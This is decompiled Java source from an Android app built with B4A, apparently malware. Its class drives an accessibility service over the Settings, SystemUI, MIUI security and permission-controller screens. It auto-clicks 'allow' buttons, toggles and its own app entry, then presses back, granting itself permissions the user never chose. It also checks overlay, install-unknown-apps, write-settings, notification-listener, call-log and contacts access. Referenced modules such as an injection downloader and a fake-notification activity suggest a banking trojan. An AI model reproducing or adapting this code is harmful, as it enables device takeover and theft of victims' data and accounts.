package com.com.androidrr;

import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.agraham.reflection.Reflection;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.constants.Colors;
import anywheresoftware.b4a.objects.RuntimePermissions;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import com.tillekesoft.accessibilityservices.AccessibilityConstants;
import com.tillekesoft.accessibilityservices.AccessibilityEventsListenerWrapper;

/* loaded from: classes.dex */
public class clsclassperms_code2 {
    private static clsclassperms_code2 mostCurrent = new clsclassperms_code2();
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static String _process_globals() throws Exception {
        return "";
    }

    public static String _show_perms_screen(BA ba) throws Exception {
        return "";
    }

    public static Object getObject() {
        throw new RuntimeException("Code module does not support this method.");
    }

    public static boolean _candrawoverlays(BA ba) throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            JavaObject javaObject2 = new JavaObject();
            new Phone();
            if (Phone.getSdkVersion() < 23) {
                return true;
            }
            javaObject.InitializeContext(ba.processBA == null ? ba : ba.processBA);
            javaObject2.InitializeStatic("android.provider.Settings");
            return BA.ObjectToBoolean(javaObject2.RunMethod("canDrawOverlays", new Object[]{javaObject.getObject()}));
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("63407886", BA.ObjectToString(Common.LastException(ba)), 0);
            return false;
        }
    }

    public static boolean _canrequestpackageinstalls(BA ba) throws Exception {
        try {
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeContext(ba.processBA == null ? ba : ba.processBA);
            new JavaObject();
            return BA.ObjectToBoolean(((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), javaObject.RunMethod("getPackageManager", (Object[]) Common.Null))).RunMethod("canRequestPackageInstalls", (Object[]) Common.Null));
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("63538952", BA.ObjectToString(Common.LastException(ba)), 0);
            return false;
        }
    }

    public static boolean _canwritetosystemsettings(BA ba) throws Exception {
        new Phone();
        if (Phone.getSdkVersion() < 23) {
            return true;
        }
        JavaObject javaObject = new JavaObject();
        if (ba.processBA != null) {
            ba = ba.processBA;
        }
        javaObject.InitializeContext(ba);
        JavaObject javaObject2 = new JavaObject();
        javaObject2.InitializeStatic("android.provider.Settings.System");
        return BA.ObjectToBoolean(javaObject2.RunMethod("canWrite", new Object[]{javaObject.getObject()}));
    }

    public static boolean _check_if_notis(BA ba) throws Exception {
        try {
            new Phone();
            String lowerCase = Phone.GetSettings("enabled_notification_listeners").toLowerCase();
            B4AApplication b4AApplication = Common.Application;
            return lowerCase.contains(B4AApplication.getPackageName().toLowerCase());
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("63342348", BA.ObjectToString(Common.LastException(ba)), 0);
            return false;
        }
    }

    public static boolean _check_ifsettings(BA ba, String str) throws Exception {
        try {
            if (str.toLowerCase().contains("com.android.settings") || str.toLowerCase().contains("com.android.systemui") || str.toLowerCase().contains("com.miui.securitycenter") || str.contains("permissioncontroller")) {
                return true;
            }
            return str.toLowerCase().contains("allow");
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("63211275", BA.ObjectToString(Common.LastException(ba)), 0);
            return false;
        }
    }

    public static String _check_perms(BA ba, String str, String str2, List list, Object obj) throws Exception {
        String str3;
        String str4;
        int i;
        boolean z;
        String str5;
        String str6;
        String str7;
        String str8;
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        globalparameters._ispermstarted_new = 1;
        if (!_check_ifsettings(ba, BA.ObjectToString(list))) {
            return "";
        }
        _click_anyallow(ba, list, str, str2);
        new Map();
        int size = list.getSize();
        int i2 = 0;
        int i3 = 0;
        while (true) {
            str3 = "switch_widget";
            str4 = "viewid";
            if (i2 >= size) {
                break;
            }
            if (BA.ObjectToString(((Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) list.Get(i2))).Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                i3++;
            }
            i2++;
        }
        Common.LogImpl("63145744", "ismultiswitches : " + BA.NumberToString(i3), 0);
        backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
        String str9 = "ViewText";
        String str10 = "Height";
        if (AccessibilityEventsListenerWrapper.AccessibilityEventsListener.findAndGetFirstSimilar(obj, "com.android.settings:id/list", true) == null) {
            backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
            if (AccessibilityEventsListenerWrapper.AccessibilityEventsListener.findAndGetFirstSimilar(obj, "com.android.settings:id/recycler_view", true) == null) {
                backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                if (AccessibilityEventsListenerWrapper.AccessibilityEventsListener.findAndGetFirstSimilar(obj, "android:id/list", true) == null) {
                    if (i3 == 1) {
                        if (BA.ObjectToString(list).contains("switch_widget")) {
                            new Map();
                            int size2 = list.getSize();
                            for (int i4 = 0; i4 < size2; i4++) {
                                Map map = (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) list.Get(i4));
                                if (BA.ObjectToString(map.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                    backgroundservice backgroundserviceVar4 = mostCurrent._backgroundservice;
                                    backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map.Get("Left")), (int) BA.ObjectToNumber(map.Get("Top")), (int) BA.ObjectToNumber(map.Get("width")), (int) BA.ObjectToNumber(map.Get("Height")), "", "android:id/switch_widget");
                                    backgroundservice backgroundserviceVar5 = mostCurrent._backgroundservice;
                                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                    backgroundservice backgroundserviceVar6 = mostCurrent._backgroundservice;
                                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                                    backgroundservice backgroundserviceVar7 = mostCurrent._backgroundservice;
                                    AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                                    accessibilityEventsListener5.PerformGlobalAction(1);
                                    backgroundservice backgroundserviceVar8 = mostCurrent._backgroundservice;
                                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener6 = backgroundservice._acs;
                                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                    _show_perms_screen(ba);
                                    return "";
                                }
                            }
                        }
                        return "";
                    }
                    new Map();
                    int size3 = list.getSize();
                    int i5 = 0;
                    boolean z2 = false;
                    while (i5 < size3) {
                        Map map2 = (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) list.Get(i5));
                        String lowerCase = BA.ObjectToString(map2.Get(str9)).toLowerCase();
                        B4AApplication b4AApplication = Common.Application;
                        if (lowerCase.contains(B4AApplication.getLabelName().toLowerCase())) {
                            z2 = true;
                        }
                        if (z2) {
                            if (BA.ObjectToString(map2.Get(str4)).toLowerCase().contains(str3.toLowerCase()) && 0.0d == BA.ObjectToNumber(map2.Get("checked"))) {
                                backgroundservice backgroundserviceVar9 = mostCurrent._backgroundservice;
                                i = size3;
                                z = z2;
                                str5 = str3;
                                str8 = str9;
                                if (backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map2.Get("Left")), (int) BA.ObjectToNumber(map2.Get("Top")), (int) BA.ObjectToNumber(map2.Get("width")), (int) BA.ObjectToNumber(map2.Get(str10)), "", "android:id/switch_widget")) {
                                    backgroundservice backgroundserviceVar10 = mostCurrent._backgroundservice;
                                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener7 = backgroundservice._acs;
                                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                    _show_perms_screen(ba);
                                    Colors colors = Common.Colors;
                                    Common.LogImpl("63145810", "sucess", -16711936);
                                    return "";
                                }
                            } else {
                                i = size3;
                                z = z2;
                                str5 = str3;
                                str8 = str9;
                                if (BA.ObjectToString(map2.Get(str4)).toLowerCase().contains("checkbox".toLowerCase())) {
                                    backgroundservice backgroundserviceVar11 = mostCurrent._backgroundservice;
                                    str6 = str4;
                                    str7 = str10;
                                    if (backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map2.Get("Left")), (int) BA.ObjectToNumber(map2.Get("Top")), (int) BA.ObjectToNumber(map2.Get("width")), (int) BA.ObjectToNumber(map2.Get(str10)), "", "android:id/checkbox")) {
                                        backgroundservice backgroundserviceVar12 = mostCurrent._backgroundservice;
                                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener8 = backgroundservice._acs;
                                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                        _show_perms_screen(ba);
                                        Colors colors2 = Common.Colors;
                                        Common.LogImpl("63145821", "sucess", -16711936);
                                        return "";
                                    }
                                }
                            }
                            str6 = str4;
                            str7 = str10;
                        } else {
                            i = size3;
                            z = z2;
                            str5 = str3;
                            str6 = str4;
                            str7 = str10;
                            str8 = str9;
                        }
                        i5++;
                        size3 = i;
                        str4 = str6;
                        str9 = str8;
                        str3 = str5;
                        z2 = z;
                        str10 = str7;
                    }
                    String str11 = str9;
                    String str12 = str10;
                    new Map();
                    int size4 = list.getSize();
                    for (int i6 = 0; i6 < size4; i6++) {
                        Map map3 = (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) list.Get(i6));
                        String lowerCase2 = BA.ObjectToString(map3.Get(str11)).toLowerCase();
                        B4AApplication b4AApplication2 = Common.Application;
                        if (lowerCase2.contains(B4AApplication.getLabelName().toLowerCase())) {
                            backgroundservice backgroundserviceVar13 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener9 = backgroundservice._acs;
                            int ObjectToNumber = (int) BA.ObjectToNumber(map3.Get("Left"));
                            int ObjectToNumber2 = (int) BA.ObjectToNumber(map3.Get("Top"));
                            int ObjectToNumber3 = (int) BA.ObjectToNumber(map3.Get("width"));
                            int ObjectToNumber4 = (int) BA.ObjectToNumber(map3.Get(str12));
                            B4AApplication b4AApplication3 = Common.Application;
                            if (accessibilityEventsListener9.PerformClick_ByTemp(ObjectToNumber, ObjectToNumber2, ObjectToNumber3, ObjectToNumber4, B4AApplication.getLabelName().toLowerCase(), "")) {
                                backgroundservice backgroundserviceVar14 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener10 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar15 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener11 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar16 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                                accessibilityEventsListener11.PerformGlobalAction(1);
                                backgroundservice backgroundserviceVar17 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener12 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                Colors colors3 = Common.Colors;
                                Common.LogImpl("63145841", "clicked label name 1 ", -16711936);
                                return "";
                            }
                        }
                    }
                    backgroundservice backgroundserviceVar18 = mostCurrent._backgroundservice;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener13 = backgroundservice._acs;
                    B4AApplication b4AApplication4 = Common.Application;
                    String labelName = B4AApplication.getLabelName();
                    backgroundservice backgroundserviceVar19 = mostCurrent._backgroundservice;
                    AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                    accessibilityEventsListener13.PerformNodeActionOnViewWithArgs(false, labelName, 16, (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) Common.Null));
                    backgroundservice backgroundserviceVar20 = mostCurrent._backgroundservice;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener14 = backgroundservice._acs;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(1000);
                    backgroundservice backgroundserviceVar21 = mostCurrent._backgroundservice;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener15 = backgroundservice._acs;
                    backgroundservice backgroundserviceVar22 = mostCurrent._backgroundservice;
                    AccessibilityConstants accessibilityConstants4 = backgroundservice._accservconstants;
                    accessibilityEventsListener15.PerformGlobalAction(1);
                    backgroundservice backgroundserviceVar23 = mostCurrent._backgroundservice;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener16 = backgroundservice._acs;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(1000);
                    _show_perms_screen(ba);
                    Colors colors4 = Common.Colors;
                    Common.LogImpl("63145855", "clicked label name 2 ", -16711936);
                    return "";
                }
            }
        }
        Colors colors5 = Common.Colors;
        Common.LogImpl("63145750", "found the list!!!!!!", -16711936);
        Common.LogImpl("63145751", BA.ObjectToString(obj), 0);
        new Map();
        int size5 = list.getSize();
        for (int i7 = 0; i7 < size5; i7++) {
            Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) list.Get(i7));
            String lowerCase3 = BA.ObjectToString(map4.Get("ViewText")).toLowerCase();
            B4AApplication b4AApplication5 = Common.Application;
            if (lowerCase3.contains(B4AApplication.getLabelName().toLowerCase())) {
                Common.LogImpl("63145755", BA.ObjectToString(map4), 0);
                backgroundservice backgroundserviceVar24 = mostCurrent._backgroundservice;
                if (backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("width")), (int) BA.ObjectToNumber(map4.Get("Height")), "", "")) {
                    backgroundservice backgroundserviceVar25 = mostCurrent._backgroundservice;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener17 = backgroundservice._acs;
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                    Colors colors6 = Common.Colors;
                    Common.LogImpl("63145762", "click within the list --------- ", -16711936);
                    return "";
                }
                backgroundservice backgroundserviceVar26 = mostCurrent._backgroundservice;
                backgroundservice._acs.DispatchGesture_Normal((int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")), (int) BA.ObjectToNumber(map4.Get("Left")), (int) BA.ObjectToNumber(map4.Get("Top")));
                backgroundservice backgroundserviceVar27 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener18 = backgroundservice._acs;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                return "";
            }
        }
        return "";
    }

    public static String _click_anyallow(BA ba, List list, String str, String str2) throws Exception {
        int i;
        try {
            new Map();
            int size = list.getSize();
            while (i < size) {
                Map map = new Map();
                java.util.Map map2 = (java.util.Map) list.Get(i);
                java.util.Map map3 = map2;
                Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
                i = (BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("android:id/button1") || BA.ObjectToString(map4.Get("viewid")).toLowerCase().contains("permission_allow_button")) ? 0 : i + 1;
                Common.LogImpl("63735557", "found it and clicked", 0);
                backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = backgroundservice._acs;
                backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
                AccessibilityConstants accessibilityConstants = backgroundservice._accservconstants;
                Map map5 = new Map();
                java.util.Map map6 = (java.util.Map) Common.Null;
                java.util.Map map7 = map6;
                accessibilityEventsListener.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map5, map6));
                backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener2 = backgroundservice._acs;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                backgroundservice backgroundserviceVar4 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener3 = backgroundservice._acs;
                backgroundservice backgroundserviceVar5 = mostCurrent._backgroundservice;
                AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                Map map8 = new Map();
                java.util.Map map9 = (java.util.Map) Common.Null;
                java.util.Map map10 = map9;
                accessibilityEventsListener3.PerformNodeActionOnViewWithArgs(true, "com.android.permissioncontroller:id/permission_allow_button", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map8, map9));
                backgroundservice backgroundserviceVar6 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener4 = backgroundservice._acs;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                backgroundservice backgroundserviceVar7 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener5 = backgroundservice._acs;
                backgroundservice backgroundserviceVar8 = mostCurrent._backgroundservice;
                AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                accessibilityEventsListener5.PerformGlobalAction(1);
                backgroundservice backgroundserviceVar9 = mostCurrent._backgroundservice;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener6 = backgroundservice._acs;
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                return "";
            }
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("63735569", BA.ObjectToString(Common.LastException(ba)), 0);
        }
        return "";
    }

    public static boolean _requestpowermngt(BA ba) throws Exception {
        try {
            if (((int) BA.ObjectToNumber(new Reflection().GetStaticField("android.os.Build$VERSION", "SDK_INT"))) < 23) {
                return true;
            }
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeContext(ba.processBA == null ? ba : ba.processBA);
            return BA.ObjectToBoolean(javaObject.RunMethod("isIgnoringBatteryOptimizations", (Object[]) Common.Null));
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("63670034", BA.ObjectToString(Common.LastException(ba)), 0);
            return false;
        }
    }

    public static boolean _startcalllogperm(BA ba) throws Exception {
        boolean z = true;
        try {
            starter starterVar = mostCurrent._starter;
            RuntimePermissions runtimePermissions = starter._rp;
            starter starterVar2 = mostCurrent._starter;
            RuntimePermissions runtimePermissions2 = starter._rp;
            starter starterVar3 = mostCurrent._starter;
            RuntimePermissions runtimePermissions3 = starter._rp;
            starter starterVar4 = mostCurrent._starter;
            RuntimePermissions runtimePermissions4 = starter._rp;
            starter starterVar5 = mostCurrent._starter;
            RuntimePermissions runtimePermissions5 = starter._rp;
            starter starterVar6 = mostCurrent._starter;
            RuntimePermissions runtimePermissions6 = starter._rp;
            Object[] objArr = {RuntimePermissions.PERMISSION_READ_CALL_LOG, RuntimePermissions.PERMISSION_WRITE_CALL_LOG, RuntimePermissions.PERMISSION_WRITE_CONTACTS, RuntimePermissions.PERMISSION_READ_CONTACTS, RuntimePermissions.PERMISSION_GET_ACCOUNTS, RuntimePermissions.PERMISSION_READ_PHONE_STATE};
            for (int i = 0; i < 6; i++) {
                String ObjectToString = BA.ObjectToString(objArr[i]);
                starter starterVar7 = mostCurrent._starter;
                if (!starter._rp.Check(ObjectToString)) {
                    z = false;
                }
            }
        } catch (Exception e) {
            (ba.processBA == null ? ba : ba.processBA).setLastException(e);
            Common.LogImpl("63604490", BA.ObjectToString(Common.LastException(ba)), 0);
        }
        return z;
    }
}